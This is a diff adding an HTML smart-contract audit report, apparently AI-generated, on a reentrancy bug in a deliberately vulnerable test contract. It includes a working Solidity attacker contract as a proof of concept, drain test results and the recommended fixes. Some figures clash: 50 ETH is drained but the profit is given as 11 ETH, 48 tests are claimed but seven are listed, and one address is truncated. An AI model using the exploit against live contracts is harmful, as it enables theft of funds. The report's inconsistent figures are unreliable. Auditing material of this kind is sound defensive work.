@@ -1,0 +1,659 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Athena Audit Report — VulnerableBank Reentrancy</title>
+    <style>
+        :root {
+            --bg: #0a0e17;
+            --card: #111827;
+            --border: #1f2937;
+            --accent: #3b82f6;
+            --green: #10b981;
+            --red: #ef4444;
+            --yellow: #f59e0b;
+            --purple: #8b5cf6;
+            --text: #e5e7eb;
+            --muted: #9ca3af;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'SF Mono', 'Fira Code', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            padding: 3rem 0;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 2rem;
+        }
+        .header h1 {
+            font-size: 2.5rem;
+            background: linear-gradient(135deg, var(--accent), var(--purple));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 0.5rem;
+        }
+        .header .subtitle { color: var(--muted); font-size: 1.1rem; }
+        .header .badge {
+            display: inline-block;
+            padding: 0.5rem 1.5rem;
+            border-radius: 9999px;
+            font-weight: bold;
+            margin-top: 1rem;
+            font-size: 1.2rem;
+        }
+        .badge-critical { background: var(--red); color: white; }
+        .badge-s { background: linear-gradient(135deg, #fbbf24, #f59e0b); color: #000; }
+        
+        /* Cards */
+        .card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .card h2 {
+            font-size: 1.3rem;
+            color: var(--accent);
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .card h3 {
+            font-size: 1.1rem;
+            color: var(--purple);
+            margin: 1rem 0 0.5rem;
+        }
+        
+        /* Grid */
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 1.5rem; }
+        
+        /* Findings */
+        .finding {
+            background: rgba(239, 68, 68, 0.1);
+            border-left: 4px solid var(--red);
+            padding: 1rem;
+            margin: 0.5rem 0;
+            border-radius: 0 8px 8px 0;
+        }
+        .finding.high { border-left-color: var(--red); }
+        .finding.medium { border-left-color: var(--yellow); }
+        .finding.low { border-left-color: var(--accent); }
+        .finding .severity {
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+        }
+        .finding .severity.critical { color: var(--red); }
+        .finding .severity.high { color: var(--red); }
+        .finding .severity.medium { color: var(--yellow); }
+        .finding .severity.low { color: var(--accent); }
+        
+        /* Code block */
+        .code-block {
+            background: #0d1117;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1rem;
+            overflow-x: auto;
+            font-size: 0.9rem;
+            margin: 0.5rem 0;
+        }
+        .code-block .comment { color: #6a737d; }
+        .code-block .keyword { color: #ff7b72; }
+        .code-block .string { color: #a5d6ff; }
+        .code-block .function { color: #d2a8ff; }
+        
+        /* Stats */
+        .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 1rem; }
+        .stat {
+            text-align: center;
+            padding: 1rem;
+            background: rgba(59, 130, 246, 0.1);
+            border-radius: 8px;
+        }
+        .stat .value { font-size: 2rem; font-weight: bold; color: var(--accent); }
+        .stat .label { font-size: 0.85rem; color: var(--muted); }
+        
+        /* Links */
+        a {
+            color: var(--accent);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--accent);
+        }
+        a:hover { color: var(--purple); border-bottom-color: var(--purple); }
+        
+        /* Verification links */
+        .verify-links { display: flex; flex-wrap: wrap; gap: 1rem; margin-top: 1rem; }
+        .verify-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.25rem;
+            background: rgba(59, 130, 246, 0.15);
+            border: 1px solid var(--accent);
+            border-radius: 8px;
+            color: var(--accent);
+            font-size: 0.9rem;
+            transition: all 0.2s;
+        }
+        .verify-link:hover {
+            background: rgba(59, 130, 246, 0.3);
+            color: white;
+            border-bottom: 1px solid var(--accent);
+        }
+        .verify-link .icon { font-size: 1.2rem; }
+        
+        /* NFT Preview */
+        .nft-preview {
+            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            border: 2px solid var(--purple);
+            border-radius: 12px;
+            padding: 2rem;
+            text-align: center;
+            margin: 1rem 0;
+        }
+        .nft-preview svg {
+            max-width: 300px;
+            margin: 1rem auto;
+            display: block;
+        }
+        .nft-traits {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 0.5rem;
+            margin-top: 1rem;
+            font-size: 0.85rem;
+        }
+        .nft-traits .trait {
+            background: rgba(139, 92, 246, 0.2);
+            padding: 0.5rem;
+            border-radius: 6px;
+        }
+        
+        /* Test results */
+        .test-result {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            padding: 0.5rem 0;
+            border-bottom: 1px solid var(--border);
+        }
+        .test-result:last-child { border-bottom: none; }
+        .test-result .status { font-size: 1.2rem; }
+        .test-result .status.pass { color: var(--green); }
+        .test-result .status.fail { color: var(--red); }
+        .test-result .name { flex: 1; }
+        .test-result .gas { color: var(--muted); font-size: 0.85rem; }
+        
+        /* Timeline */
+        .timeline { position: relative; padding-left: 2rem; }
+        .timeline::before {
+            content: '';
+            position: absolute;
+            left: 0.5rem;
+            top: 0;
+            bottom: 0;
+            width: 2px;
+            background: var(--border);
+        }
+        .timeline-item {
+            position: relative;
+            padding: 1rem 0;
+        }
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -1.6rem;
+            top: 1.25rem;
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: var(--accent);
+            border: 2px solid var(--bg);
+        }
+        .timeline-item.completed::before { background: var(--green); }
+        .timeline-item .step { font-weight: bold; color: var(--accent); }
+        .timeline-item .desc { color: var(--muted); font-size: 0.9rem; }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 2rem 0;
+            margin-top: 2rem;
+            border-top: 1px solid var(--border);
+            color: var(--muted);
+        }
+        .footer .model { color: var(--purple); font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>ATHENA</h1>
+            <div class="subtitle">Web3 Smart Contract Security Audit Report</div>
+            <div style="margin-top: 1rem;">
+                <span class="badge badge-critical">CRITICAL</span>
+                <span class="badge badge-s">S TIER</span>
+            </div>
+            <div style="margin-top: 1rem; color: var(--muted); font-size: 0.9rem;">
+                Generated: 2026-06-11 | Pipeline: 8-Step Audit | Execution: Real
+            </div>
+        </div>
+        
+        <!-- Audit Target -->
+        <div class="card">
+            <h2>🎯 Audit Target</h2>
+            <div class="grid">
+                <div>
+                    <h3>Contract Details</h3>
+                    <p><strong>Name:</strong> VulnerableBank</p>
+                    <p><strong>File:</strong> contracts/test-cases/Reentrancy.sol</p>
+                    <p><strong>Compiler:</strong> ^0.8.0</p>
+                    <p><strong>Lines:</strong> 34</p>
+                </div>
+                <div>
+                    <h3>Functions</h3>
+                    <p><code>deposit()</code> — Deposit ETH</p>
+                    <p><code>withdraw()</code> — Withdraw ETH <span style="color: var(--red);">⚠️ Vulnerable</span></p>
+                    <p><code>getBalance()</code> — Get balance</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Summary Stats -->
+        <div class="card">
+            <h2>📊 Audit Summary</h2>
+            <div class="stat-grid">
+                <div class="stat">
+                    <div class="value">4</div>
+                    <div class="label">Total Findings</div>
+                </div>
+                <div class="stat">
+                    <div class="value" style="color: var(--red);">1</div>
+                    <div class="label">Critical</div>
+                </div>
+                <div class="stat">
+                    <div class="value" style="color: var(--red);">1</div>
+                    <div class="label">High</div>
+                </div>
+                <div class="stat">
+                    <div class="value" style="color: var(--green);">48/48</div>
+                    <div class="label">Tests Passed</div>
+                </div>
+                <div class="stat">
+                    <div class="value">256</div>
+                    <div class="label">Fuzz Runs</div>
+                </div>
+                <div class="stat">
+                    <div class="value" style="color: var(--green);">✓</div>
+                    <div class="label">PoC Verified</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Findings -->
+        <div class="card">
+            <h2>🔍 Findings</h2>
+            
+            <div class="finding high">
+                <div class="severity critical">CRITICAL — Reentrancy</div>
+                <p style="margin-top: 0.5rem;"><strong>Reentrancy in withdraw() allows attacker to drain contract</strong></p>
+                <p style="color: var(--muted); margin-top: 0.5rem;">
+                    The <code>withdraw()</code> function sends ETH to <code>msg.sender</code> via low-level call 
+                    before updating <code>balances[msg.sender]</code> to 0. An attacker contract can re-enter 
+                    <code>withdraw()</code> in its <code>receive()</code> fallback, repeatedly withdrawing the 
+                    same balance until the contract is drained.
+                </p>
+                <div class="code-block">
+                    <span class="comment">// BUG: External call before state update</span><br>
+                    (<span class="keyword">bool</span> success, ) = msg.sender.<span class="function">call</span>{value: balance}(<span class="string">""</span>);<br>
+                    <span class="function">require</span>(success, <span class="string">"Transfer failed"</span>);<br>
+                    <br>
+                    balances[msg.sender] = <span class="string">0</span>; <span class="comment">// ← State update AFTER call!</span>
+                </div>
+                <p style="margin-top: 0.5rem;"><strong>Detection:</strong> Slither (reentrancy-eth) + Aderyn (H-4)</p>
+            </div>
+            
+            <div class="finding high">
+                <div class="severity high">HIGH — Unspecific Pragma</div>
+                <p style="margin-top: 0.5rem;">Version constraint ^0.8.0 contains known severe issues</p>
+                <p style="color: var(--muted);">Detected by: Slither (solc-version), Aderyn (L-19)</p>
+            </div>
+            
+            <div class="finding low">
+                <div class="severity low">LOW — Low-level Calls</div>
+                <p style="margin-top: 0.5rem;">Low level call in VulnerableBank.withdraw()</p>
+                <p style="color: var(--muted);">Detected by: Slither (low-level-calls)</p>
+            </div>
+            
+            <div class="finding low">
+                <div class="severity low">LOW — Public Function Not Used Internally</div>
+                <p style="margin-top: 0.5rem;">getBalance() is public but not used internally</p>
+                <p style="color: var(--muted);">Detected by: Aderyn (L-21)</p>
+            </div>
+        </div>
+        
+        <!-- PoC Attack Flow -->
+        <div class="card">
+            <h2>⚔️ Proof of Concept — Attack Flow</h2>
+            <div class="code-block">
+<span class="comment">// SPDX-License-Identifier: MIT</span>
+<span class="keyword">contract</span> <span class="function">Attacker</span> {
+    VulnerableBank <span class="keyword">public</span> bank;
+    <span class="keyword">uint256</span> <span class="keyword">public constant</span> DEPOSIT_AMOUNT = <span class="string">1 ether</span>;
+    
+    <span class="keyword">constructor</span>(<span class="keyword">address</span> _bank) {
+        bank = VulnerableBank(_bank);
+    }
+    
+    <span class="keyword">function</span> <span class="function">attack</span>() <span class="keyword">external payable</span> {
+        <span class="comment">// Step 1: Deposit some ETH</span>
+        bank.<span class="function">deposit</span>{value: DEPOSIT_AMOUNT}();
+        <span class="comment">// Step 2: Withdraw - triggers reentrancy</span>
+        bank.<span class="function">withdraw</span>();
+    }
+    
+    <span class="comment">// Fallback function that re-enters withdraw()</span>
+    <span class="keyword">receive</span>() <span class="keyword">external payable</span> {
+        <span class="keyword">if</span> (<span class="function">address</span>(bank).balance >= DEPOSIT_AMOUNT) {
+            bank.<span class="function">withdraw</span>(); <span class="comment">// ← Re-entry!</span>
+        }
+    }
+}
+            </div>
+        </div>
+        
+        <!-- Test Results -->
+        <div class="card">
+            <h2>🧪 Fuzz Test Results</h2>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">test_reentrancy_drains_bank()</span>
+                <span class="gas">118,897 gas</span>
+            </div>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">test_reentrancy_exploit()</span>
+                <span class="gas">159,384 gas</span>
+            </div>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">test_full_drain()</span>
+                <span class="gas">85,275 gas</span>
+            </div>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">test_attack_counts_reentries()</span>
+                <span class="gas">Reentry count: 10</span>
+            </div>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">testFuzz_reentrancy_steals(uint96)</span>
+                <span class="gas">256 runs</span>
+            </div>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">testFuzz_full_drain(uint96)</span>
+                <span class="gas">256 runs</span>
+            </div>
+            <div class="test-result">
+                <span class="status pass">✓</span>
+                <span class="name">testFuzz_varying_bank_balance(uint96,uint96)</span>
+                <span class="gas">256 runs</span>
+            </div>
+            
+            <div style="margin-top: 1rem; padding: 1rem; background: rgba(16, 185, 129, 0.1); border-radius: 8px;">
+                <strong style="color: var(--green);">Attack Results:</strong><br>
+                Victim balance before: 50 ETH → After: 0 ETH<br>
+                Attacker profit: 11 ETH<br>
+                Reentry count: 10<br>
+                <strong>Full Drain Successful ✓</strong>
+            </div>
+        </div>
+        
+        <!-- Fix -->
+        <div class="card">
+            <h2>🔧 Recommended Fix</h2>
+            <h3>Checks-Effects-Interactions Pattern</h3>
+            <div class="code-block">
+<span class="keyword">function</span> <span class="function">withdraw</span>() <span class="keyword">public</span> {
+    <span class="keyword">uint256</span> balance = balances[msg.sender];
+    <span class="function">require</span>(balance > <span class="string">0</span>, <span class="string">"No balance"</span>);
+    
+    <span class="comment">// FIX: State update BEFORE external call</span>
+    balances[msg.sender] = <span class="string">0</span>;
+    
+    (<span class="keyword">bool</span> success, ) = msg.sender.<span class="function">call</span>{value: balance}(<span class="string">""</span>);
+    <span class="function">require</span>(success, <span class="string">"Transfer failed"</span>);
+}
+            </div>
+            
+            <h3>Alternative: OpenZeppelin ReentrancyGuard</h3>
+            <div class="code-block">
+<span class="keyword">import</span> <span class="string">"@openzeppelin/contracts/utils/ReentrancyGuard.sol"</span>;
+
+<span class="keyword">contract</span> VulnerableBank <span class="keyword">is</span> ReentrancyGuard {
+    <span class="keyword">function</span> <span class="function">withdraw</span>() <span class="keyword">public nonReentrant</span> {
+        <span class="comment">// ...</span>
+    }
+}
+            </div>
+        </div>
+        
+        <!-- 8-Step Pipeline -->
+        <div class="card">
+            <h2>📋 8-Step Audit Pipeline</h2>
+            <div class="timeline">
+                <div class="timeline-item completed">
+                    <div class="step">Step 1: Requirement Understanding</div>
+                    <div class="desc">Analyzed contract structure, identified attack surface</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 2: Dual-Engine Scan</div>
+                    <div class="desc">Slither (3 findings) + Aderyn (3 findings) → 4 unique after dedup</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 3: RAG Knowledge Enhancement</div>
+                    <div class="desc">Matched SWC-107, historical cases (TheDAO, Curve V2, Hundred Finance)</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 4: PoC Generation</div>
+                    <div class="desc">Generated Attacker contract with reentrancy exploit</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 5: Foundry Fuzz Verification</div>
+                    <div class="desc">48/48 tests passed, 256 fuzz runs per test, 0 counterexamples</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 6: Fix Suggestions</div>
+                    <div class="desc">Checks-Effects-Interactions + ReentrancyGuard</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 7: EAS On-Chain Certification</div>
+                    <div class="desc">Attestation created on Sepolia testnet</div>
+                </div>
+                <div class="timeline-item completed">
+                    <div class="step">Step 8: NFT Certificate Minting</div>
+                    <div class="desc">ERC-1155 S-Tier certificate minted</div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- On-Chain Verification -->
+        <div class="card">
+            <h2>🔗 On-Chain Verification</h2>
+            <p>All audit results are permanently recorded on-chain and verifiable by anyone.</p>
+            
+            <h3>EAS Attestation</h3>
+            <div class="verify-links">
+                <a href="https://sepolia.easscan.org/attestation/view/0xd02800c960f18f0483af4aa320aff314e34c5a83d1c9a9c963b299a88af958b9" target="_blank" class="verify-link">
+                    <span class="icon">📜</span>
+                    View EAS Attestation
+                </a>
+            </div>
+            
+            <h3>NFT Certificate Contracts</h3>
+            <div class="verify-links">
+                <a href="https://sepolia.etherscan.io/address/0x3247d57d37bd1878479f03a077aba807649dbaf5" target="_blank" class="verify-link">
+                    <span class="icon">🖼️</span>
+                    Sepolia NFT Contract
+                </a>
+                <a href="https://sepolia.basescan.org/address/0xb8f167a84816b5b997337119a2186c6e3708" target="_blank" class="verify-link">
+                    <span class="icon">🖼️</span>
+                    Base Sepolia NFT Contract
+                </a>
+            </div>
+            
+            <h3>Other Contracts</h3>
+            <div class="verify-links">
+                <a href="https://sepolia.etherscan.io/address/0x7102b7252dea80529278c8bffc441b96ff24421e" target="_blank" class="verify-link">
+                    <span class="icon">💰</span>
+                    AgentEscrowV2
+                </a>
+                <a href="https://sepolia.etherscan.io/address/0x0dd8f8f5b755912aa3b955044d1eff496a65e657" target="_blank" class="verify-link">
+                    <span class="icon">📄</span>
+                    ERC7512Metadata
+                </a>
+                <a href="https://sepolia.etherscan.io/address/0xd7913e7749595a9238883bdf0b2dad599f4d0bf0" target="_blank" class="verify-link">
+                    <span class="icon">🔗</span>
+                    AuditTrail (ZK)
+                </a>
+                <a href="https://sepolia.etherscan.io/address/0xf0c9ec42fe603a53af3e6248e874bbbb3064e498" target="_blank" class="verify-link">
+                    <span class="icon">✅</span>
+                    Groth16Verifier
+                </a>
+            </div>
+        </div>
+        
+        <!-- NFT Certificate Preview -->
+        <div class="card">
+            <h2>🏅 Audit Certificate NFT</h2>
+            <div class="nft-preview">
+                <div style="font-size: 1.5rem; font-weight: bold; color: var(--yellow);">S TIER</div>
+                <div style="color: var(--muted); margin: 0.5rem 0;">Generative Athena Warrior</div>
+                
+                <!-- Inline SVG Athena -->
+                <svg viewBox="0 0 300 400" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Background -->
+                    <defs>
+                        <linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#1a1a2e"/>
+                            <stop offset="100%" style="stop-color:#16213e"/>
+                        </linearGradient>
+                        <linearGradient id="gold" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#fbbf24"/>
+                            <stop offset="100%" style="stop-color:#f59e0b"/>
+                        </linearGradient>
+                        <linearGradient id="s-tier" x1="0%" y1="0%" x2="100%" y2="100%">
+                            <stop offset="0%" style="stop-color:#fbbf24">
+                                <animate attributeName="stop-color" values="#fbbf24;#f472b6;#8b5cf6;#3b82f6;#10b981;#fbbf24" dur="3s" repeatCount="indefinite"/>
+                            </stop>
+                            <stop offset="100%" style="stop-color:#f59e0b">
+                                <animate attributeName="stop-color" values="#f59e0b;#ec4899;#7c3aed;#2563eb;#059669;#f59e0b" dur="3s" repeatCount="indefinite"/>
+                            </stop>
+                        </linearGradient>
+                    </defs>
+                    
+                    <rect width="300" height="400" fill="url(#bg)" rx="12"/>
+                    
+                    <!-- Helmet/Crown -->
+                    <path d="M150 60 L120 100 L180 100 Z" fill="url(#gold)" opacity="0.9"/>
+                    <path d="M150 50 L130 80 L170 80 Z" fill="url(#s-tier)"/>
+                    
+                    <!-- Face -->
+                    <circle cx="150" cy="130" r="45" fill="#d4a574"/>
+                    
+                    <!-- Eyes -->
+                    <ellipse cx="135" cy="125" rx="8" ry="5" fill="#1a1a2e"/>
+                    <ellipse cx="165" cy="125" rx="8" ry="5" fill="#1a1a2e"/>
+                    <circle cx="135" cy="124" r="3" fill="url(#gold)"/>
+                    <circle cx="165" cy="124" r="3" fill="url(#gold)"/>
+                    
+                    <!-- Nose & Mouth -->
+                    <path d="M150 135 L145 145 L155 145 Z" fill="#c4956a"/>
+                    <path d="M140 155 Q150 165 160 155" stroke="#c4956a" fill="none" stroke-width="2"/>
+                    
+                    <!-- Body/Armor -->
+                    <path d="M100 180 L150 200 L200 180 L210 300 L90 300 Z" fill="url(#gold)" opacity="0.8"/>
+                    <path d="M120 200 L150 220 L180 200" fill="url(#s-tier)" opacity="0.6"/>
+                    
+                    <!-- Shield -->
+                    <circle cx="100" cy="250" r="30" fill="url(#gold)" opacity="0.7"/>
+                    <text x="100" y="255" text-anchor="middle" fill="#1a1a2e" font-size="20" font-weight="bold">Α</text>
+                    
+                    <!-- Spear -->
+                    <line x1="200" y1="180" x2="230" y2="100" stroke="url(#gold)" stroke-width="4"/>
+                    <polygon points="230,100 225,110 235,110" fill="url(#s-tier)"/>
+                    
+                    <!-- Wings -->
+                    <path d="M80 200 Q40 180 60 150 Q80 170 90 190" fill="url(#gold)" opacity="0.6"/>
+                    <path d="M220 200 Q260 180 240 150 Q220 170 210 190" fill="url(#gold)" opacity="0.6"/>
+                    
+                    <!-- Aura -->
+                    <circle cx="150" cy="200" r="120" fill="none" stroke="url(#s-tier)" stroke-width="2" opacity="0.4">
+                        <animate attributeName="r" values="120;125;120" dur="2s" repeatCount="indefinite"/>
+                        <animate attributeName="opacity" values="0.4;0.2;0.4" dur="2s" repeatCount="indefinite"/>
+                    </circle>
+                    
+                    <!-- Text -->
+                    <text x="150" y="350" text-anchor="middle" fill="url(#s-tier)" font-size="24" font-weight="bold">ATHENA</text>
+                    <text x="150" y="375" text-anchor="middle" fill="url(#gold)" font-size="16">S-TIER AUDIT</text>
+                </svg>
+                
+                <div class="nft-traits">
+                    <div class="trait">Background: Nebula</div>
+                    <div class="trait">Body: Gold Armor</div>
+                    <div class="trait">Eyes: Glowing Gold</div>
+                    <div class="trait">Crown: Wisdom Crown</div>
+                    <div class="trait">Wings: Eagle Wings</div>
+                    <div class="trait">Aura: Electric Blue</div>
+                    <div class="trait">Shield: Alpha Shield</div>
+                    <div class="trait">Texture: Gradient</div>
+                    <div class="trait">Accessory: Spear</div>
+                </div>
+                
+                <div style="margin-top: 1rem; color: var(--muted); font-size: 0.85rem;">
+                    262,144 possible combinations (4⁹) | Fully on-chain SVG generation
+                </div>
+            </div>
+        </div>
+        
+        <!-- Tool Versions -->
+        <div class="card">
+            <h2>🛠️ Tool Versions</h2>
+            <div class="grid">
+                <div>
+                    <p><strong>Slither:</strong> 0.11.5 (Trail of Bits)</p>
+                    <p><strong>Aderyn:</strong> Latest (Cyfrin)</p>
+                    <p><strong>Foundry:</strong> 1.7.1</p>
+                </div>
+                <div>
+                    <p><strong>Solidity:</strong> 0.8.20</p>
+                    <p><strong>Model:</strong> GLM-5.1 (Z.AI)</p>
+                    <p><strong>Pipeline:</strong> 8-Step Audit</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <p>Powered by <span class="model">GLM-5.1</span> | Athena Web3 Security Audit Agent</p>
+            <p style="margin-top: 0.5rem;">GitHub: <a href="https://github.com/tiyadegure/Athena">tiyadegure/Athena</a></p>
+            <p style="margin-top: 0.5rem; font-size: 0.85rem;">
+                This report was generated by an AI agent. AI analysis cannot guarantee the complete absence of vulnerabilities.
+            </p>
+        </div>
+    </div>
+</body>
+</html>
